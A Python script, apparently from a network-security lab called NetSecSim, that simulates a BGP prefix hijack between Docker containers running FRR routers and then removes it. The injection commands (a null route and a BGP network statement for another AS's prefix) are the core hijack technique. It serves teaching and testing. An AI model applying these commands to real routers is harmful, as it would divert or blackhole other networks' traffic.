#!/usr/bin/env python3
"""
NetSecSim Simple Attack Simulator
"""

import subprocess
import time
from datetime import datetime

class SimpleAttackSimulator:
    def __init__(self):
        self.attack_log = []
        
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        self.attack_log.append(log_entry)
        print(log_entry)
    
    def execute_frr_command(self, container, command):
        """Execute FRR command"""
        try:
            result = subprocess.run(
                ['docker', 'exec', '-it', container, 'vtysh', '-c', command],
                capture_output=True, text=True, timeout=15
            )
            return result.returncode == 0
        except Exception as e:
            self.log(f"Command failed: {e}")
            return False
    
    def show_routes(self, container):
        """Show current routes"""
        try:
            result = subprocess.run(
                ['docker', 'exec', '-t', container, 'vtysh', '-c', 'show ip bgp'],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                print(f"\n{container.upper()} Routes:")
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip().startswith('*'):
                        print(f"  {line.strip()}")
        except Exception as e:
            print(f"Error showing routes: {e}")
    
    def prefix_hijack_demo(self):
        """Demonstrate prefix hijacking"""
        self.log("=== PREFIX HIJACK ATTACK DEMO ===")
        
        # Show baseline
        self.log("BASELINE: Current routing state")
        self.show_routes('as1')
        self.show_routes('as2')
        
        # Inject hijacked route
        self.log("ATTACK: AS1 hijacking AS2's prefix 10.1.2.0/24")
        
        commands = [
            "configure terminal",
            "ip route 10.1.2.0/24 null0", 
            "router bgp 65001",
            "network 10.1.2.0/24",
            "end"
        ]
        
        cmd_string = '; '.join(commands)
        success = subprocess.run(
            ['docker', 'exec', '-it', 'as1', 'vtysh', '-c', cmd_string],
            timeout=20
        ).returncode == 0
        
        if success:
            self.log("✓ Attack route injected")
            
            # Clear BGP to force update
            subprocess.run(['docker', 'exec', '-it', 'as1', 'vtysh', '-c', 'clear ip bgp *'])
            subprocess.run(['docker', 'exec', '-it', 'as2', 'vtysh', '-c', 'clear ip bgp *'])
            
            time.sleep(10)
            
            self.log("ATTACK STATE: Routes after hijack")
            self.show_routes('as1') 
            self.show_routes('as2')
            
            # Cleanup
            time.sleep(10)
            self.log("CLEANUP: Removing attack")
            
            cleanup_commands = [
                "configure terminal",
                "no ip route 10.1.2.0/24 null0",
                "router bgp 65001", 
                "no network 10.1.2.0/24",
                "end"
            ]
            
            cleanup_string = '; '.join(cleanup_commands)
            subprocess.run(['docker', 'exec', '-it', 'as1', 'vtysh', '-c', cleanup_string])
            subprocess.run(['docker', 'exec', '-it', 'as1', 'vtysh', '-c', 'clear ip bgp *'])
            subprocess.run(['docker', 'exec', '-it', 'as2', 'vtysh', '-c', 'clear ip bgp *'])
            
            self.log("✓ Attack cleaned up")
            
        else:
            self.log("✗ Attack injection failed")
        
        # Save log
        with open(f'attack_log_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt', 'w') as f:
            f.write('\n'.join(self.attack_log))

def main():
    print("NetSecSim Attack Simulator")
    print("=========================")
    
    simulator = SimpleAttackSimulator()
    simulator.prefix_hijack_demo()

if __name__ == "__main__":
    main()
